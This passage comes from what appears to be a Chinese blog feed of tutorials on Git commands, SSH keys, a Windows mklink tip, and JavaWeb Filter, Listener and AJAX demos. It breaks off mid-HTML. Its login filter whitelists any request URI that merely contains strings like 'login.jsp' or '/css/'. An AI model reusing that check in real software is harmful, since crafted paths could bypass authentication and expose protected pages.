href="https://www.cnblogs.com/cjm123/p/8243424.html">https://www.cnblogs.com/cjm123/p/8243424.html</a></p><p>公钥私钥加密可以看作古代 的”虎符” , 我们本地电脑有一份,远程服务器有一份, 只要 “虎符” 核对通过表示身份无误,可以执行提交等操作,无需输入用户名密码</p><h3 id="2、生成和使用公钥私钥"><a href="#2、生成和使用公钥私钥" class="headerlink" title="2、生成和使用公钥私钥"></a>2、生成和使用公钥私钥</h3><p>生成公钥私钥：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ssh-keygen -t rsa</span><br></code></pre></td></tr></table></figure><p> 一直回车即可<br> 会默认用户目录 .ssh 目录生成一个默认的id_rsa文件 和id_rsa.pub</p><p><img src="/img/Git/1/1572520139221.png"></p><p><img src="/img/Git/1/1572520293700.png"></p><p>ssh密钥配置：</p><p>在Git仓库，上传RSA公钥</p><p><img src="/img/Git/1/1572520396806.png"></p><h2 id="四、git基本操作"><a href="#四、git基本操作" class="headerlink" title="四、git基本操作"></a>四、git基本操作</h2><h3 id="1、介绍"><a href="#1、介绍" class="headerlink" title="1、介绍"></a>1、介绍</h3><p>​    上述我们的操作 使用的 是客户端TortoiseGit 操作的git ,实际上底层依旧是使用的命令行帮我们执行, 在早期 git 并没有窗口化工具,开发人员只能使用命令行模式</p><p>  实际上,如果你掌握并熟练使用了命令行模式操作git 的话,你会发现某些操作命令行比窗口化操作要简单</p><p>所有你在工作中会发现高深的技术人员可能会喜欢命令行模式提交git</p><h4 id="1-1、环境配置"><a href="#1-1、环境配置" class="headerlink" title="1.1、环境配置"></a>1.1、环境配置</h4><p>当安装Git后首先要做的事情是设置用户名称和email地址。这是非常重要的，因为每次Git提交都会使用该用户信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">设置用户信息</span> <br>   git config --global user.name “itcast”<br>   git config --global user.email “itcast@itcast.cn”<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看配置信息</span><br>   git config --list<br>   git config user.name<br><span class="hljs-meta prompt_">#</span><span class="language-bash">通过上面的命令设置的信息会保存在~/.gitconfig文件中</span><br><br></code></pre></td></tr></table></figure><h4 id="1-2、初始化本地仓库-init"><a href="#1-2、初始化本地仓库-init" class="headerlink" title="1.2、初始化本地仓库 init"></a>1.2、初始化本地仓库 init</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化仓库带工作区</span><br>git init<br><span class="hljs-meta prompt_"># </span><span class="language-bash">初始化仓库不带工作区</span><br>git init --bare  <br></code></pre></td></tr></table></figure><h4 id="1-3、克隆-clone"><a href="#1-3、克隆-clone" class="headerlink" title="1.3、克隆 clone"></a>1.3、克隆 clone</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库克隆</span><br>git clone 远程Git仓库地址 <br>例如: git clone https://gitee.com/itcast/gittest.git<br></code></pre></td></tr></table></figure><h4 id="1-4、查看状态-status"><a href="#1-4、查看状态-status" class="headerlink" title="1.4、查看状态 status"></a>1.4、查看状态 status</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看状态</span><br>git status <br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看状态 使输出信息更加简洁</span><br>git status –s <br></code></pre></td></tr></table></figure><h4 id="1-5、add"><a href="#1-5、add" class="headerlink" title="1.5、add"></a>1.5、add</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将未跟踪的文件加入暂存区</span><br>git add  &lt;文件名&gt;  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">将暂存区的文件取消暂存 (取消 add )</span><br>git reset  &lt;文件名&gt;  <br><br></code></pre></td></tr></table></figure><h4 id="1-6、commit"><a href="#1-6、commit" class="headerlink" title="1.6、commit"></a>1.6、commit</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">git commit 将暂存区的文件修改提交到本地仓库</span><br>git commit -m &quot;日志信息&quot;  &lt;文件名&gt;  <br><br></code></pre></td></tr></table></figure><h4 id="1-7、删除-rm"><a href="#1-7、删除-rm" class="headerlink" title="1.7、删除 rm"></a>1.7、删除 rm</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">从本地工作区 删除文件</span><br>git rm &lt;文件名&gt;  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">如果本工作区库误删, 想要回退</span><br>git checkout head &lt;文件名&gt;  <br></code></pre></td></tr></table></figure><h3 id="2、git-远程仓库操作"><a href="#2、git-远程仓库操作" class="headerlink" title="2、git 远程仓库操作"></a>2、git 远程仓库操作</h3><h4 id="2-1、查看远程"><a href="#2-1、查看远程" class="headerlink" title="2.1、查看远程"></a>2.1、查看远程</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程  列出指定的每一个远程服务器的简写</span><br>git remote <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程 , 列出 简称和地址</span><br>git remote  -v  <br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看远程仓库详细地址</span><br>git remote show  &lt;仓库简称&gt;<br><br></code></pre></td></tr></table></figure><h4 id="2-2、添加-移除远测仓库"><a href="#2-2、添加-移除远测仓库" class="headerlink" title="2.2、添加/移除远测仓库"></a>2.2、添加/移除远测仓库</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">添加远程仓库</span><br>git remote add &lt;shortname&gt; &lt;url&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">移除远程仓库和本地仓库的关系(只是从本地移除远程仓库的关联关系，并不会真正影响到远程仓库)</span><br>git remote rm &lt;shortname&gt; <br></code></pre></td></tr></table></figure><h4 id="2-3、从远程仓库获取代码"><a href="#2-3、从远程仓库获取代码" class="headerlink" title="2.3、从远程仓库获取代码"></a>2.3、从远程仓库获取代码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库克隆</span><br>git clone &lt;url&gt; <br><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库拉取 (拉取到.git 目录,不会合并到工作区,工作区发生变化)</span><br>git fetch  &lt;shortname&gt;  &lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">手动合并  把某个版本的某个分支合并到当前工作区</span><br>git merge &lt;shortname&gt;/&lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">从远程仓库拉取 (拉取到.git 目录,合并到工作区,工作区不发生变化) = fetch+merge</span><br>git pull  &lt;shortname&gt;  &lt;分支名称&gt;<br>git pull  &lt;shortname&gt;  &lt;分支名称&gt;  --allow-unrelated-histories  #  强制拉取合并<br></code></pre></td></tr></table></figure><p>注意：如果当前本地仓库不是从远程仓库克隆，而是本地创建的仓库，并且仓库中存在文件，此时再从远程仓库拉取文件的时候会报错（fatal: refusing to merge unrelated histories ），解决此问题可以在git pull命令后加入参数–allow-unrelated-histories (如上 命令)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">将本地仓库推送至远程仓库的某个分支</span><br>git push [remote-name] [branch-name]<br></code></pre></td></tr></table></figure><h3 id="3、命令行–-分支"><a href="#3、命令行–-分支" class="headerlink" title="3、命令行– 分支"></a>3、命令行– 分支</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">默认 分支名称为 master</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有本地分支</span><br>git branch<br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有远程分支</span><br>git branch -r<br><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有本地分支和远程分支</span><br>git branch -a<br><span class="hljs-meta prompt_"># </span><span class="language-bash">创建分支</span><br>git branch &lt;分支名&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">切换分支</span> <br>git checkout &lt;分支名&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除分支(如果分支已经修改过,则不允许删除)</span><br>git branch -d  &lt;分支名&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">强制删除分支</span><br>git branch -D  &lt;分支名&gt;<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">提交分支至远程仓库</span><br>git push &lt;仓库简称&gt; &lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">合并分支 将其他分支合并至当前工作区</span><br>git merge &lt;分支名称&gt;<br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除远程仓库分支</span><br>git push origin –d branchName<br></code></pre></td></tr></table></figure><h3 id="4、命令行-–tag"><a href="#4、命令行-–tag" class="headerlink" title="4、命令行 –tag"></a>4、命令行 –tag</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">列出所有tag</span><br>git tag<br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看tag详细信息</span> <br>git show [tagName]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">新建一个tag</span><br>git tag [tagName]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">提交指定tag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git push [仓库简称] [tagName]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">新建一个分支，指向某个tag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b [branch] [tag]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除本地tag</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git tag -d [tag]</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除远程tag (注意 空格)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git push origin :refs/tags/[tag]</span><br></code></pre></td></tr></table></figure><h2 id="五、相关软件配置和使用git"><a href="#五、相关软件配置和使用git" class="headerlink" title="五、相关软件配置和使用git"></a>五、相关软件配置和使用git</h2><h3 id="1、intellij"><a href="#1、intellij" class="headerlink" title="1、intellij"></a>1、intellij</h3><h3 id="2、VS-Code"><a href="#2、VS-Code" class="headerlink" title="2、VS Code"></a>2、VS Code</h3>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础1-项目实践1</title>
    <link href="/2023/05/21/JavaWeb_1_3/"/>
    <url>/2023/05/21/JavaWeb_1_3/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础1-项目实践1"><a href="#JavaWeb基础1-项目实践1" class="headerlink" title="JavaWeb基础1-项目实践1"></a>JavaWeb基础1-项目实践1</h1><h2 id="一、综合案例1（一个数据库表页面）"><a href="#一、综合案例1（一个数据库表页面）" class="headerlink" title="一、综合案例1（一个数据库表页面）"></a>一、综合案例1（一个数据库表页面）</h2><p>代码已开源</p><p>github：</p><p><a href="https://github.com/PennDavid/MyJavaLearnHub">https://github.com/PennDavid/MyJavaLearnHub</a></p><p>gitee：</p><p><a href="https://gitee.com/penndavid/MyJavaLearnHub">https://gitee.com/penndavid/MyJavaLearnHub</a></p><h2 id="二、其他小实践"><a href="#二、其他小实践" class="headerlink" title="二、其他小实践"></a>二、其他小实践</h2><h3 id="1、验证码"><a href="#1、验证码" class="headerlink" title="1、验证码"></a>1、验证码</h3><h3 id="2、表格"><a href="#2、表格" class="headerlink" title="2、表格"></a>2、表格</h3>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2305-实用小技巧1</title>
    <link href="/2023/05/19/2305-tip1/"/>
    <url>/2023/05/19/2305-tip1/</url>
    
    <content type="html"><![CDATA[<h1 id="2305-实用小技巧1"><a href="#2305-实用小技巧1" class="headerlink" title="2305-实用小技巧1"></a>2305-实用小技巧1</h1><h2 id="1、建立文件夹映射"><a href="#1、建立文件夹映射" class="headerlink" title="1、建立文件夹映射"></a>1、建立文件夹映射</h2><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">mklink /d &quot;C:/A&quot; &quot;C:/B/A&quot;<br></code></pre></td></tr></table></figure><p>第一个：(eg: C:/A)：要建立映射的地址（会在资源管理器创建/显示一个文件夹）</p><p>第二个：(eg: C:/B/A)：映射到的文件夹地址</p><p>注意：必须加””</p><p>相关知识链接：<a href="https://blog.csdn.net/qq_52102933/article/details/126792094">https://blog.csdn.net/qq_52102933/article/details/126792094</a></p>]]></content>
    
    
    <categories>
      
      <category>Tips</category>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tips</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础1-2</title>
    <link href="/2023/05/18/JavaWeb_1_2/"/>
    <url>/2023/05/18/JavaWeb_1_2/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础1-2"><a href="#JavaWeb基础1-2" class="headerlink" title="JavaWeb基础1-2"></a>JavaWeb基础1-2</h1><h2 id="八、Filter"><a href="#八、Filter" class="headerlink" title="八、Filter"></a>八、Filter</h2><p>概念：FiIter表示过滤器，是 JavaWeb三大组件(Servlet、Filter、Listener)之一<br>过滤器可以把对资源的请求拦截下来，从而实现一些特殊的功能。<br>过滤器一般完成一些通用的操作，比如：权限控制、统一编码处理、敏感字符处理等等</p><p><img src="/img/JavaWeb/1-2/Filter1.png"></p><h3 id="1、入门"><a href="#1、入门" class="headerlink" title="1、入门"></a>1、入门</h3><p>Filter类的案例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span><br><span class="hljs-comment">//配置的拦截资源的路径</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 拦截具体的资源：/index.jsp: 只有访问 index.jsp 时才会被拦截</span><br><span class="hljs-comment"> * 目录拦截：     /user/*   : 访问 /use 下的所有资源都会被拦截</span><br><span class="hljs-comment"> * 后缀名拦截：   *.jsp     : 访问后缀名为 jsp 的资源，都会被拦截</span><br><span class="hljs-comment"> * 拦截所有 ：    /*        : 访问所有资源，都会被拦截</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">FilterDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-comment">//实现Filter接口，重写方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-comment">//放行前代码，一般对request数据进行处理</span><br>        System.out.println(<span class="hljs-string">&quot;1---FilterDemo doFilter---&quot;</span>);<br>        <span class="hljs-comment">//放行</span><br>        filterChain.doFilter(servletRequest,servletResponse);<br>        <span class="hljs-comment">//放行后会访问资源</span><br>        <span class="hljs-comment">//放行后代码，一般对response数据进行处理</span><br>        System.out.println(<span class="hljs-string">&quot;2---FilterDemo doFilter---&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="2、Filter链"><a href="#2、Filter链" class="headerlink" title="2、Filter链"></a>2、Filter链</h3><p>多个Filter过滤器</p><p>注解配置的 Filter，优先级按照过滤器类名（字符串）的自然排序</p><p><img src="/img/JavaWeb/1-2/Filter2.png"></p><h3 id="3、登录案例"><a href="#3、登录案例" class="headerlink" title="3、登录案例"></a>3、登录案例</h3><p><img src="/img/JavaWeb/1-2/Filter3.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebFilter(&quot;/*&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br><br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-type">HttpServletRequest</span> <span class="hljs-variable">httpreq</span> <span class="hljs-operator">=</span> (HttpServletRequest) servletRequest;<br>        <span class="hljs-comment">//0-1.排除登录相关资源</span><br>        String urls[] = &#123;<span class="hljs-string">&quot;login.jsp&quot;</span>,<span class="hljs-string">&quot;/loginServlet&quot;</span>,<span class="hljs-string">&quot;/css/&quot;</span>,<span class="hljs-string">&quot;/js/&quot;</span>,<span class="hljs-string">&quot;/fonts/&quot;</span>,<span class="hljs-string">&quot;/checkCodeServlet&quot;</span>&#125;;<br>        <span class="hljs-comment">//0-2.获取请求路径</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> httpreq.getRequestURI().toString();<br>        <span class="hljs-comment">//0-3.判断是否包含登录相关资源路径</span><br>        <span class="hljs-keyword">for</span> (String u : urls) &#123;<br>            <span class="hljs-keyword">if</span>(url.contains(u))&#123;<br>                <span class="hljs-comment">//包含，放行</span><br>                filterChain.doFilter(servletRequest,servletResponse);<br>                <span class="hljs-keyword">return</span>;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//1.判断session中是否有登录用户信息</span><br>        <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> httpreq.getSession();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> session.getAttribute(<span class="hljs-string">&quot;user&quot;</span>);<br><br>        <span class="hljs-comment">//2.判断是否有登录信息</span><br>        <span class="hljs-keyword">if</span>(user == <span class="hljs-literal">null</span>)&#123;<br>            <span class="hljs-comment">//没有登录，跳转到登录页面</span><br>            httpreq.setAttribute(<span class="hljs-string">&quot;login_msg&quot;</span>,<span class="hljs-string">&quot;您尚未登录，请登录&quot;</span>);<br>            httpreq.getRequestDispatcher(<span class="hljs-string">&quot;/login.jsp&quot;</span>).forward(servletRequest,servletResponse);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-comment">//已经登录，放行</span><br>            filterChain.doFilter(servletRequest,servletResponse);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="九、Listener"><a href="#九、Listener" class="headerlink" title="九、Listener"></a>九、Listener</h2><p>概念：Listener 表示监听器，是 JavaWeb 三大组件 (ServIets、FiIter、Listener) 之一</p><p>监听器可以监听就是在application,session,request三个对象创建、销毁或者往其中添加修改删除属性时自动执行到代码的功能组件<br>Listener 分类： JavaWeb 中提供了 8 个监听器</p><p><img src="/img/JavaWeb/1-2/Listener1.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ListenerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContextListener</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextInitialized</span><span class="hljs-params">(ServletContextEvent servletContextEvent)</span> &#123;<br>        <span class="hljs-comment">//加载资源</span><br>        System.out.println(<span class="hljs-string">&quot;ListenerDemo contextInitialized...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextDestroyed</span><span class="hljs-params">(ServletContextEvent servletContextEvent)</span> &#123;<br>        <span class="hljs-comment">//释放资源</span><br>        System.out.println(<span class="hljs-string">&quot;ListenerDemo contextDestroyed...&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="十、AJAX"><a href="#十、AJAX" class="headerlink" title="十、AJAX"></a>十、AJAX</h2><h3 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h3><p>AJAX(Asynchronous JavaScript And XML)：异步的 JavaScript 和 XML</p><h3 id="2、作用"><a href="#2、作用" class="headerlink" title="2、作用"></a>2、作用</h3><p>1.与服务器进行数据交换 ： 通过 AJAX 可以给服务器发送请求，并获取服务器响应的数据</p><p>使用了 AJAX 和服务器进行通信，就可以使用 HTML+AJAX 来替换 JSP 页面了</p><p>2.异步交互：可以在不重新加载整个页面的情况下，与服务器交换数据并更新部分网页的技术，如：搜索联想、用户名是否可用校验，等等 </p><p>3.同步和异步</p><p><img src="/img/JavaWeb/1-2/AJAX1.png"></p><h3 id="3、入门"><a href="#3、入门" class="headerlink" title="3、入门"></a>3、入门</h3><p> 服务端（后端）Demo：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(&quot;/ajaxServlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AjaxDemo</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.getWriter().write(<span class="hljs-string">&quot;hello, ajax!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>客户端（前端）Demo：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Title<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span 